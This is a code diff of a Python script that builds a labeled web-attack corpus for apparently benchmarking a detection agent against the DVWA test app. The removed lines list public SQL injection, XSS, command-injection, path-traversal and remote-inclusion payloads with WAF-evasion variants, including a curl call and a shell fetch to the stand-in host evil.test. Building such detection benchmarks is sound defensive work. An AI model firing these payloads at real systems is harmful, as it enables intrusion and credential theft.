@@ -1,21 +1,34 @@
 """Build the labeled attack corpus from PUBLIC payload sources (anti-bias).
 
-Payloads are taken from well-known public references — PortSwigger Web Security
-Academy, OWASP, and PayloadsAllTheThings — NOT hand-crafted to favor the agent.
-Each entry records its `source`. Run: python build_corpus.py  ->  corpus.jsonl
+Payloads are NOT hand-crafted to favor the agent — they are collected from
+well-known public references (PayloadsAllTheThings, PortSwigger Web Security
+Academy, OWASP, SecLists) and kept in two committed data files next to this
+script, so the build is reproducible and the payloads are auditable:
+
+  payloads_attack.txt          clear_attack + evasion, one payload per line
+                               under `## <group> :: <attack_type>` sections,
+                               optional `=== family ===` grouping (see the
+                               file's own header for the format).
+  payloads_benign_recon.json   fp_bait, benign_normal, and the recon group
+                               (directory scan + login brute force).
 
 v2 layout (docs/CORPUS_V2.md): deterministic eids, a benchmark actor per row
-(sent as X-Forwarded-For), interleaved replay order (`seq`), and a fixed
-dev/test split by payload family. Command injection goes as a POST form, as
-DVWA's exec page does.
+(sent as X-Forwarded-For), interleaved replay order (`seq`) that keeps each
+recon chain in order, and a fixed dev/test split by payload family. Command
+injection goes as a POST form, as DVWA's exec page does. Run: python build_corpus.py
 """
 
 import hashlib
 import json
 import os
 import random
+import re
 
-OUT = os.path.join(os.path.dirname(__file__), "corpus.jsonl")
+HERE = os.path.dirname(__file__)
+OUT = os.path.join(HERE, "corpus.jsonl")
+ATTACK_FILE = os.path.join(HERE, "payloads_attack.txt")
+BENIGN_RECON_FILE = os.path.join(HERE, "payloads_benign_recon.json")
+
 SEED = 20260930
 DEV_FRACTION = 0.3
 # documentation ranges (RFC 5737): not routable, and not private -> is_private()
@@ -24,96 +37,90 @@ ATTACKERS = [f"203.0.113.{i}" for i in range(10, 15)]
 USERS = [f"198.51.100.{i}" for i in range(10, 40)]
 ATTACKER_BENIGN_SHARE = 0.25   # attackers browse normally too: IP history isn't a label oracle
 
-# (attack_type, mitre, path, param, payload, source)
-CLEAR_ATTACK = [
-    # SQL injection — classic, public
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR '1'='1", "PortSwigger SQLi"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR 1=1-- -", "PayloadsAllTheThings SQLi"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' UNION SELECT user,password FROM users-- -", "PortSwigger SQLi UNION"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1'; DROP TABLE users-- -", "OWASP SQLi"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' AND SLEEP(5)-- -", "PayloadsAllTheThings blind SQLi"),
-    # XSS — reflected, public
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<script>alert(1)</script>", "OWASP XSS"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<img src=x onerror=alert(1)>", "PortSwigger XSS"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<svg/onload=alert(document.cookie)>", "PayloadsAllTheThings XSS"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "javascript:alert(1)", "OWASP XSS"),
-    # Command injection
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1; cat /etc/passwd", "PayloadsAllTheThings CMDi"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1 && whoami", "OWASP CMDi"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1 | id", "PayloadsAllTheThings CMDi"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "$(curl http://evil.test)", "PortSwigger CMDi"),
-    # LFI / path traversal
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "../../../../../../etc/passwd", "OWASP Path Traversal"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "/etc/passwd", "PayloadsAllTheThings LFI"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "../../../../etc/shadow", "PayloadsAllTheThings LFI"),
-    ("rfi", "T1190", "/vulnerabilities/fi/", "page", "http://evil.test/shell.txt", "OWASP RFI"),
-]
-
-# Obfuscated / evasion variants of the SAME attack classes (public techniques)
-EVASION = [
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1'/**/OR/**/1=1-- -", "PayloadsAllTheThings WAF bypass"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -", "PayloadsAllTheThings MySQL inline comment"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' UnIoN SeLeCt 1,2-- -", "PayloadsAllTheThings case mix"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1%27%20OR%201%3D1--%20-", "URL-encoded SQLi (OWASP)"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1%2527%2520OR%25201%253D1", "Double-URL-encoded SQLi (PayloadsAllTheThings)"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR 0x31=0x31-- -", "Hex-encoded SQLi (PayloadsAllTheThings)"),
-    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR CHAR(49)=CHAR(49)-- -", "CHAR() obfuscation (PayloadsAllTheThings)"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<scr<script>ipt>alert(1)</scr</script>ipt>", "OWASP nested-tag bypass"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded XSS (OWASP)"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<IMG SRC=x ONERROR=alert(1)>", "Case-mixed XSS (PayloadsAllTheThings)"),
-    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<svg><script>&#97;lert(1)</script>", "HTML-entity XSS (PortSwigger)"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1;cat${IFS}/etc/passwd", "PayloadsAllTheThings IFS bypass"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1%0acat%20/etc/passwd", "Newline-injection CMDi (PayloadsAllTheThings)"),
-    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1;c\\at /et\\c/pa\\sswd", "Backslash-evasion CMDi (PayloadsAllTheThings)"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "..%2f..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal (OWASP)"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "....//....//....//etc/passwd", "Nested traversal bypass (PayloadsAllTheThings)"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "%252e%252e%252fetc%252fpasswd", "Double-encoded traversal (PayloadsAllTheThings)"),
-    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "php://filter/convert.base64-encode/resource=index", "PHP wrapper LFI (PayloadsAllTheThings)"),
-]
-
-# Benign requests that LOOK malicious (false-positive bait) — label benign
-FP_BAIT = [
-    ("/vulnerabilities/sqli/", {"id": "What is a UNION SELECT statement in SQL?"}, "blog-style query w/ SQL keywords"),
-    # an apostrophe in natural-language search text is the classic SQLi false
-    # positive; on the sqli page's numeric id it would really break out of the quote
-    ("/search", {"q": "How to prevent ' OR 1=1 injection"}, "article search with an apostrophe"),
-    ("/search", {"q": "best practices to stop XSS <script> attacks"}, "search about XSS"),
-    ("/search", {"q": "tutorial: command injection ; cat examples"}, "educational search"),
-    ("/blog/post", {"title": "Understanding ../../ path traversal defense"}, "blog title w/ traversal text"),
-    ("/feedback", {"comment": "I really like using <b>bold</b> and lists in HTML"}, "benign HTML in comment"),
-    ("/vulnerabilities/fi/", {"page": "passwd_reset_help"}, "filename contains 'passwd' substring"),
-    ("/products", {"category": "union-jack-flags"}, "word 'union' in benign context"),
-    ("/api/notes", {"text": "select all items and drop them in cart"}, "SQL-like words, benign sentence"),
-]
-
-# Normal traffic — label benign
-BENIGN_NORMAL = [
-    ("/login.php", {}, "login page"),
-    ("/index.php", {}, "home page"),
-    ("/vulnerabilities/sqli/", {"id": "1"}, "legitimate id lookup"),
-    ("/vulnerabilities/xss_r/", {"name": "Alice"}, "normal name input"),
-    ("/vulnerabilities/exec/", {"ip": "8.8.8.8"}, "legitimate ping"),
-    ("/vulnerabilities/fi/", {"page": "include.php"}, "normal page include"),
-    ("/products", {"category": "books"}, "product browse"),
-    ("/search", {"q": "wireless headphones"}, "normal search"),
-    ("/api/notes", {"text": "remember to buy milk"}, "normal note"),
-    ("/profile", {"user": "bob"}, "view profile"),
-]
-
+# attack_type -> (DVWA page, injected parameter, MITRE technique). The payload
+# file only carries the attack_type + payload string; the page/param/mitre live
+# here so the data file stays a flat list of public payloads.
+ATTACK_MAP = {
+    "sqli": ("/vulnerabilities/sqli/", "id", "T1190"),
+    "xss": ("/vulnerabilities/xss_r/", "name", "T1059.007"),
+    "cmdi": ("/vulnerabilities/exec/", "ip", "T1059"),
+    "lfi": ("/vulnerabilities/fi/", "page", "T1083"),
+    "rfi": ("/vulnerabilities/fi/", "page", "T1190"),
+}
 
 _UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 # DVWA's exec page is a POST form — benign pings too, or the method would leak the label
 POST_FORMS = {"/vulnerabilities/exec/"}
 
+_SECTION = re.compile(r"##\s*(clear_attack|evasion)\s*::\s*(sqli|xss|cmdi|lfi|rfi)\b")
+_FAMILY = re.compile(r"^===\s*(.+?)\s*===$")
 
-def _row(group: str, label: str, attack_type: str, mitre: str, path: str,
-         params: dict, source: str) -> dict:
-    row = dict(group=group, label=label, attack_type=attack_type, mitre=mitre,
-               method="GET", path=path, params=params, user_agent=_UA,
-               source=source)
+
+def parse_attack_file(path: str) -> list[tuple]:
+    """(group, attack_type, payload, family) per non-comment line. A line marks
+    a family for the lines that follow it until the next family / section; a
+    payload with no family gets its own (family=None here -> its eid later)."""
+    out, group, atype, family = [], None, None, None
+    with open(path, encoding="utf-8") as f:
+        for raw in f:
+            s = raw.strip()
+            m = _SECTION.match(s)
+            if m:
+                group, atype, family = m.group(1), m.group(2), None
+                continue
+            if not s or s.startswith("#"):
+                continue
+            fam = _FAMILY.match(s)
+            if fam:
+                family = fam.group(1)
+                continue
+            if group:
+                out.append((group, atype, s, family))
+    return out
+
+
+def _attack_row(group: str, attack_type: str, payload: str, family: str | None) -> dict:
+    path, param, mitre = ATTACK_MAP[attack_type]
+    row = dict(group=group, label="malicious", attack_type=attack_type, mitre=mitre,
+               method="GET", path=path, params={param: payload}, user_agent=_UA,
+               source=f"public payload ({attack_type})")
+    if family:
+        row["family"] = f"{group}:{attack_type}:{family}"
+    if path in POST_FORMS:
+        row.update(method="POST", params={}, body={param: payload, "Submit": "Submit"})
+    return row
+
+
+def _benign_row(group: str, path: str, params: dict, source: str, rationale: str = "") -> dict:
+    row = dict(group=group, label="benign", attack_type="none", mitre="",
+               method="GET", path=path, params=dict(params), user_agent=_UA, source=source)
+    if rationale:
+        row["rationale"] = rationale
     if path in POST_FORMS:
         row.update(method="POST", params={}, body={**params, "Submit": "Submit"})
     return row
+
+
+def _recon_rows(recon: dict) -> list[dict]:
+    """A directory-scan chain (GET sensitive paths) and a login brute-force
+    chain (POST /login.php, what rule 9000050 thresholds on). Each chain is one
+    family (so it stays whole on one side of the split) and `_order` keeps its
+    requests in sequence after the global shuffle."""
+    rows = []
+    for i, p in enumerate(recon.get("dirscan_paths", [])):
+        rows.append(dict(group="recon", label="malicious", attack_type="scan",
+                         mitre="T1595", method="GET", path=p, params={}, user_agent=_UA,
+                         source="SecLists Discovery/Web-Content", family="recon:dirscan",
+                         _order=i))
+    bf = recon.get("bruteforce", {})
+    user = bf.get("username", "admin")
+    for i, pw in enumerate(bf.get("passwords", [])):
+        rows.append(dict(group="recon", label="malicious", attack_type="bruteforce",
+                         mitre="T1110", method="POST", path="/login.php", params={},
+                         body={"username": user, "password": pw, "Login": "Login"},
+                         user_agent=_UA, source="SecLists Common-Credentials",
+                         family="recon:bruteforce", _order=i))
+    return rows
 
 
 def _eid(row: dict) -> str:
@@ -140,6 +147,9 @@ def _assign_splits(rows: list[dict]) -> None:
 
 
 def _assign_actor(row: dict) -> str:
+    # a recon chain is one scanner: same actor for every request in the family
+    if row["group"] == "recon":
+        return random.Random(f"{SEED}-{row['family']}").choice(ATTACKERS)
     rng = random.Random(f"{SEED}-{row['eid']}")
     if row["label"] == "malicious":
         return rng.choice(ATTACKERS)
@@ -148,30 +158,46 @@ def _assign_actor(row: dict) -> str:
     return rng.choice(USERS)
 
 
+def _interleave(rows: list[dict]) -> None:
+    """Shuffle so a replay (and triage batch) is no longer all-attacks-then-all-
+    benign, but keep each recon chain in its original order among its own slots."""
+    random.Random(SEED).shuffle(rows)
+    chains: dict[str, list[int]] = {}
+    for i, r in enumerate(rows):
+        if r.get("group") == "recon":
+            chains.setdefault(r["family"], []).append(i)
+    for idxs in chains.values():                       # idxs ascending (enumerate order)
+        ordered = sorted((rows[i] for i in idxs), key=lambda r: r["_order"])
+        for pos, r in zip(idxs, ordered):
+            rows[pos] = r
+    for r in rows:
+        r.pop("_order", None)
+    for seq, r in enumerate(rows):
+        r["seq"] = seq
+
+
 def build() -> list[dict]:
     rows: list[dict] = []
-    for atk, mitre, path, param, payload, src in CLEAR_ATTACK:
-        rows.append(_row("clear_attack", "malicious", atk, mitre, path, {param: payload}, src))
-    for atk, mitre, path, param, payload, src in EVASION:
-        rows.append(_row("evasion", "malicious", atk, mitre, path, {param: payload}, src))
-    # (a lone scanner-UA request is recon, not benign — it belongs in the recon group)
-    for path, params, src in FP_BAIT:
-        rows.append(_row("fp_bait", "benign", "none", "", path, params, src))
-    for path, params, src in BENIGN_NORMAL:
-        rows.append(_row("benign_normal", "benign", "none", "", path, params, src))
+    for group, atype, payload, family in parse_attack_file(ATTACK_FILE):
+        rows.append(_attack_row(group, atype, payload, family))
+
+    with open(BENIGN_RECON_FILE, encoding="utf-8") as f:
+        data = json.load(f)
+    for e in data.get("fp_bait", []):
+        rows.append(_benign_row("fp_bait", e["path"], e.get("params", {}),
+                                e.get("source", ""), e.get("rationale", "")))
+    for e in data.get("benign_normal", []):
+        rows.append(_benign_row("benign_normal", e["path"], e.get("params", {}),
+                                e.get("source", "")))
+    rows += _recon_rows(data.get("recon", {}))
 
     for r in rows:
         r["eid"] = _eid(r)
-        r.setdefault("family", r["eid"])      # v1 tables: every payload is its own family
+        r.setdefault("family", r["eid"])      # a payload with no declared family is its own
         r["actor_ip"] = _assign_actor(r)
     assert len({r["eid"] for r in rows}) == len(rows), "duplicate corpus rows"
     _assign_splits(rows)
-
-    # interleave actors and groups: a replay (and so a triage batch) is no longer
-    # "all attacks, then all benign"
-    random.Random(SEED).shuffle(rows)
-    for seq, r in enumerate(rows):
-        r["seq"] = seq
+    _interleave(rows)
     return rows
 
 
@@ -184,5 +210,6 @@ if __name__ == "__main__":
     for r in rows:
         by_split = counts.setdefault(r["group"], {})
         by_split[r["split"]] = by_split.get(r["split"], 0) + 1
-    print(f"Wrote {len(rows)} entries to {OUT}")
-    print("By group x split:", json.dumps(counts, indent=2))
+    n_mal = sum(r["label"] == "malicious" for r in rows)
+    print(f"Wrote {len(rows)} entries to {OUT}  (malicious {n_mal} / benign {len(rows) - n_mal})")
+    print("By group x split:", json.dumps(counts, indent=2, sort_keys=True))
